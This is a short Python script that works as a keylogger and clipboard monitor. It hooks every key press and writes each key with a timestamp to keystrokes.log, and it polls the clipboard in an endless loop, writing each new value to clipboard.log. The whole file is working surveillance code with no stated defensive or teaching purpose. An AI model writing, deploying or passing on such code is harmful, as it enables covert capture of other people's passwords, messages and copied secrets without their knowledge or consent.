
import keyboard
import pyperclip
from datetime import datetime

def log_keystroke(event):
    with open("keystrokes.log", "a") as f:
        f.write(f"{datetime.now()}: {event.name}\n")

def log_clipboard():
    previous = ""
    while True:
        current = pyperclip.paste()
        if current != previous:
            with open("clipboard.log", "a") as f:
                f.write(f"{datetime.now()}: {current}\n")
            previous = current

keyboard.on_press(log_keystroke)
log_clipboard()